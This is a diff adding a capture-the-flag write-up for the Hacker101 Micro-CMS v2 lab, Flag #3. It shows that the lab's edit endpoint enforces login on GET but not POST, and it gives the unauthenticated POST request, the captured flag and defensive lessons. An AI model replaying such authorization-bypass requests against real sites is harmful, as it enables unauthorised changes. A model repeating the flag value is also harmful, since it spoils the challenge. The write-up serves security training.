@@ -1,0 +1,51 @@
+================================
+LAB: Micro-CMS v2 - Flag #3
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: February 2, 2026
+Lab URL: https://90a297cd95bcadb5a951017071b8a6f4.ctf.hacker101.com/
+Category: Broken Access Control
+Level: Medium
+Objective: Find authorization bypass on protected endpoints
+Description: After obtaining flags #1 and #2, the challenge hint asks "What actions could you perform as a regular user on the last level which you can't now?" suggesting incomplete authorization implementation.
+
+[RECONNAISSANCE]
+----------------
+During Flag #1 exploitation, observed that GET /page/edit/1 redirects to /login (HTTP 302).
+Challenge hint suggests testing what changed from Micro-CMS v1 to v2.
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+Tested different HTTP methods on the same endpoint:
+
+GET /page/edit/1 HTTP/2
+Response: HTTP 302 redirect to /login ✓
+
+POST /page/edit/1 HTTP/2 (no auth cookie, empty body)
+Response: HTTP 200 OK with flag ✗
+
+Vulnerability: Authorization check only exists on GET, missing on POST.
+
+[EXPLOITATION]
+--------------
+POST /page/edit/1 HTTP/2
+Host: 90a297cd95bcadb5a951017071b8a6f4.ctf.hacker101.com
+
+HTTP/2 200 OK
+^FLAG^58682c5fca6f4c594911b5d8adc54b4b3ac46d8a07fd94ab165e5ad6e4e05816$FLAG$
+
+[EVIDENCE]
+----------
+Flag #3: 58682c5fca6f4c594911b5d8adc54b4b3ac46d8a07fd94ab165e5ad6e4e05816
+
+Vulnerability Type: Missing Function Level Authorization on POST method
+OWASP: A01:2021 - Broken Access Control
+
+[LESSONS LEARNED]
+-----------------
+- Always test all HTTP methods (GET, POST, PUT, DELETE) on protected endpoints
+- Authorization checks must be applied to all methods, not just GET
+- Use Burp Repeater to quickly test method variations
+- Check OWASP Top 10 #1 (Broken Access Control) systematically
